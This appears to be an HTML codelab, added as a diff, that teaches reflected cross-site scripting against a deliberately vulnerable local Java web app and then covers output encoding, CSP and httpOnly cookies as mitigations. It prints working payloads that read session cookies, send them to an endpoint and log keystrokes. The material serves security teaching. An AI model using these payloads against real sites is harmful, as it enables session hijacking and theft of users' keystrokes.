@@ -1,0 +1,223 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>Cross-Site Scripting (XSS)</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="cyber-security-cross-site-scripting"
+                  title="Cross-Site Scripting (XSS)"
+                  environment="web"
+                  feedback-link="">
+    
+      <google-codelab-step label="Overview" duration="1">
+        <h2 class="checklist" is-upgraded>What You&#39;ll Learn</h2>
+<ul>
+<li>What is Cross-Site Scripting (XSS)</li>
+<li>Demonstration of reflected cross-site scripting attacks</li>
+<li>Cross-Site Scripting Mitigations</li>
+</ul>
+<p class="image-container"><img alt="cwe-xss" src="img/da5d974f0016b276.png"></p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="What is Cross Site Scripting (XSS)?" duration="0">
+        <ul>
+<li>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites.</li>
+<li>XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end-user.</li>
+<li>Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or sanatising/encoding it.</li>
+<li>Without mitigations, the end user&#39;s browser has no way to know that the script should not be trusted, and will execute the script.</li>
+<li>The malicious script can access any cookies, local storage, or other sensitive information retained by the browser and used with that site. Scripts can even rewrite the content of the HTML page.</li>
+</ul>
+<p><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP</a></p>
+<p class="image-container"><img alt="cross-site-scripting" src="img/4232e94789721dda.png"></p>
+<p>** https://spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Prerequisites" duration="0">
+        <ul>
+<li>Ensure your hosts file has the following entries: <code>sudo vi /etc/hosts</code></li>
+</ul>
+<pre><code language="language-bash" class="language-bash">127.0.0.1 badsite.ac.uk
+127.0.0.1 trustedsite.ac.uk
+</code></pre>
+<ul>
+<li>Run the java file: <code>java -jar vulnerable-webapp-1.2.1.jar</code></li>
+<li>The default username is <code>jblogs</code> and the default password is <code>pa55word</code>.</li>
+<li>You will need a web browser such as firefox.</li>
+</ul>
+<aside class="warning"><p>IMPORTANT: If you are not experiencing the same behavior as that described in the steps below, try deleting all your cookies for that site and try again.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Demonstration of reflected cross-site scripting attacks" duration="0">
+        <p>Before we inject the cross-site scripting attacks, try:</p>
+<ul>
+<li>Navigate to <code>http://trustedsite.ac.uk:8080/items</code> and login with <code>jblogs</code> and <code>pa55word</code>.</li>
+<li>You should see a list of items.</li>
+<li>Now add a search term to the URL <code>http://trustedsite.ac.uk:8080/items?q=two</code>.</li>
+<li>You should see only items with two in the description displayed and the search term is <em>reflected</em> at the top of the page.</li>
+</ul>
+<h2 is-upgraded>A simple demonstration to show site is vulnerable to XSS</h2>
+<p>First, we will demonstrate that cross-site scripting is possible by injecting JavaScript into the items search query parameter from a cross-site (badsite → trustedsite) request.</p>
+<ul>
+<li>Navigate to <code>http://trustedsite.ac.uk:8080/items</code> and login with <code>jblogs</code> and <code>pa55word</code>.</li>
+<li>In a new browser tab, navigate to <code>http://badsite.ac.uk:8080/pet-rescue</code>. Assume you had been tricked into visiting this website.</li>
+<li>Click on the Rescue Tommy! hyperlink.</li>
+<li>Your browser should navigate to <code>trustedsite</code> and a JavaScript alert box should show. This site is vulnerable to XSS.</li>
+</ul>
+<p><strong>NOTE: Script used:</strong></p>
+<pre><code>&lt;script&gt;alert(&#39;Worked&#39;)&lt;/script&gt;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="XSS Attack - Displaying your session cookie" duration="0">
+        <p>Next, we will show how to inject JavaScript that will display the user&#39;s session cookie in an alert box.</p>
+<ul>
+<li>Navigate to <code>http://trustedsite.ac.uk:8080/items</code> and login with <code>jblogs</code> and <code>pa55word</code></li>
+<li>In a new browser tab navigate to <code>http://badsite.ac.uk:8080/pet-rescue</code>. Assume you had been tricked into visiting this website.</li>
+<li>Click on the ‘Alert Tommy&#39;s Cookies!&#39; hyperlink.</li>
+<li>Your browser should navigate to <code>trustedsite</code> and a JavaScript alert box should show with your JESSIONID.</li>
+<li>This is not ideal, but so far, has the attacker achieved much?</li>
+</ul>
+<p><strong>NOTE: Script used</strong></p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="XSS Attack - Sending your session cookie to an attacker" duration="0">
+        <p>Next, we will try sending the session cookie to an endpoint the attacker controls:</p>
+<ul>
+<li>Navigate to <code>http://trustedsite.ac.uk:8080/items</code> and login with <code>jblogs</code> and <code>pa55word</code>.</li>
+<li>In a new browser tab navigate to <code>http://badsite.ac.uk:8080/pet-rescue</code>. Assume you had been tricked into visiting this website.</li>
+<li>Click on the <em>Send me Tommy&#39;s Cookies!</em> hyperlink.</li>
+<li>Your browser should navigate to the items page of <code>trustedsite</code>.</li>
+<li>It does not appear much happened, but if you check the Java application&#39;s console for log messages, you should see something like:</li>
+</ul>
+<p><code>Found cookie [JSESSIONID=88A38544BE3E8EC6A1DF4D4D7E7C2D64]</code></p>
+<ul>
+<li>You can also check the browsers Network Inspector/Monitor to see the GET request e.g. <code>http://trustedsite.ac.uk:8080/sendme?cookie=JSESSIONID=88A38544BE3E8EC6A1DF4D4D7E7C2D64</code></li>
+</ul>
+<aside class="warning"><p>The above script invokes a full-page navigation to the <code>sendme</code> endpoint followed by a 302 redirect back to the items page. It probably happens too quickly for the user to notice. However, there is an improvement to this script in <em>Send me Tommy&#39;s Cookies (Silently)!</em> which uses an in-page JS request without a top-level navigation. You can try that too.</p>
+</aside>
+<p><strong>NOTE: Script used</strong></p>
+<pre><code language="language-js" class="language-js">&lt;script&gt;window.location=&#39;/sendme?cookie=&#39;+document.cookie&lt;/script&gt; 
+</code></pre>
+<p><strong>and</strong></p>
+<pre><code language="language-js" class="language-js">&lt;script&gt;var req = new XMLHttpRequest();req.open(&#39;GET&#39;, &#39;http://trustedsite.ac.uk:8080/sendme?cookie=&#39;+document.cookie, true);req.send();&lt;/script&gt;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="XSS Attack - Key Logging" duration="0">
+        <p>JavaScript injection is very powerful. If your site is vulnerable, you have effectively got malware running in your browser.</p>
+<p>The attacker could register a keyboard event listener script using <code>addEventListener</code> and then send all of the user&#39;s keystrokes to their server. Potentially recording sensitive information such as passwords and credit card numbers.</p>
+<ul>
+<li>Navigate to <code>http://trustedsite.ac.uk:8080/items</code> and login with <code>jblogs</code> and <code>pa55word</code>.</li>
+<li>In a new browser tab navigate to <code>http://badsite.ac.uk:8080/pet-rescue</code>. Assume you had been tricked into visiting this website.</li>
+<li>Click on the <em>Send me some keystrokes!</em> hyperlink.</li>
+<li>Your browser should navigate to the items page of <code>trustedsite</code>.</li>
+<li>Try pressing some keys whilst the browser page is in focus.</li>
+<li>Inspect the Java application&#39;s console log, you should see the keystrokes reflected there.</li>
+</ul>
+<p><strong>NOTE: Script used</strong></p>
+<pre><code language="language-js" class="language-js"> &lt;script&gt;var buffer=[];var attacker =&#39;http://trustedsite.ac.uk:8080/shadow?keys=&#39;;document.onkeypress = function(e) {var timestamp = Date.now() | 0; var stroke = {k: e.key,t: timestamp }; buffer.push(stroke); } ; window.setInterval(function() { if (buffer.length &gt; 0) {var data = encodeURIComponent(JSON.stringify(buffer));new Image().src = attacker + data;buffer = [];}}, 200);&lt;/script&gt;
+</code></pre>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="XSS Mitigations" duration="0">
+        <p>Now we&#39;ll look at the following defense against XSS attacks.</p>
+<ul>
+<li>Output Encoding.</li>
+<li>httpOnly Cookies.</li>
+<li>Content-Security-Policy</li>
+</ul>
+<p>PostiveNote, there isn&#39;t a single 100% effective defense against XSS attacks. Defense is depth is important, use as many techniques/mechanisms as you can.  </p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Output Encoding" duration="0">
+        <p>The output can be encoded by the templating engine. This was turned off in Thymeleaf for the search output on the items page. That is, <code>th:utext</code> was used instead of <code>th:text</code>.</p>
+<pre><code language="language-html" class="language-html">&lt;span style=&#34;padding: 5px&#34; th:utext=&#34;${searchTerm}&#34;&gt;
+</code></pre>
+<p>Changing <code>th:utext</code> to <code>th:text</code> would trigger Thymeleaf into encoding the injected script into a form syntactically valid for HTML, but <strong>not</strong> syntactically valid for JavaScript - thus preventing the script from being executed by the browser.</p>
+<p>If you use other frameworks you need to check if this happens natively, otherwise, you&#39;ll need a library to help encode the output.</p>
+<p>This requires the diligence of the programmer to make sure they do this correctly for every input/output. This is one of the most important ways to prevent Cross-Site Scripting attacks.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Content-Security-Policy" duration="0">
+        <p>Another line of defense against XSS is Content-Security-Policy (CSP). A simple CSP can be configured by setting the <code>cspEnabled=true</code> program argument e.g.  run the application using:</p>
+<pre><code language="language-bash" class="language-bash">java -DcspEnabled=true -jar target/vulnerable-webapp-1.2.1-SNAPSHOT.jar
+</code></pre>
+<p>This configures the CSP policy: <code>script-src 'self'</code>, which disallows inline javascript (like the ones we are injecting) from executing. The only scripts that it can run must be loaded from a separate resource file on the same origin, for example, using:</p>
+<pre><code language="language-html" class="language-html">script src=&#34;external-file-on-same-origin&#34;/.
+</code></pre>
+<p>If you now try any of the reflected XSS attacks shown so far, you should see a similar message to the following in the browser&#39;s console:</p>
+<pre><code language="language-html" class="language-html">Content Security Policy: The page&#39;s settings blocked the loading of a resource at inline (&#34;script-src&#34;)
+</code></pre>
+<p>Content Security Policies can be detailed, complicated, and hard to get right. See the slides for more information.</p>
+<aside class="special"><p>These days it is recommended to follow a ‘Strict CSP&#39; policy - see https://csp.withgoogle.com/docs/strict-csp.html.</p>
+</aside>
+<aside class="special"><p>NOTE: There are ways to still use inline scripts e.g. see <a href="https://developers.google.com/web/fundamentals/security/csp/." target="_blank">Content Security Policy</a></p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="httpOnly Cookies" duration="0">
+        <p>One small, but still important, defense against the session stealing attacks seen so far, is to set the <code>httpOnly</code> flag on our session cookie.</p>
+<p>Currently, all our cookies have the flag <code>httpOnly=false</code>. This means they can be read by scripts. Of particular worry is the session cookie named <code>JSESSIONID</code>. To prevent the session cookie from being readable — and hence easily stolen — we can set the <code>httpOnly</code> flag to <code>true</code>.</p>
+<p>Run the application again, this time using the <code>httpOnlyCookiesEnabled=true</code> program argument e.g.</p>
+<pre><code language="language-bash" class="language-bash">java -DhttpOnlyCookiesEnabled=true -jar target/vulnerable-webapp-1.2.1-SNAPSHOT.jar
+</code></pre>
+<p>Now, if you try any of the attacks above that read the session cookie they will fail, as they are unable to read <code>httpOnly</code> cookies, including, importantly, the <code>JSESSIONID</code>.</p>
+<aside class="warning"><p>IMPORTANT: This does not prevent XSS attacks, it only prevents those cookies set to httpOnly from being accessed by JavaScript, the keylogging script will still work, try it.</p>
+</aside>
+<aside class="warning"><p>IMPORTANT: If you can not steal a session cookie, you could still inject a script that performs a malicious action on the site you are on. If you have a XSS vulnerability, you are pretty much doomed, so you need to prevent it from happening in the first place.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
+
+</body>
+</html>
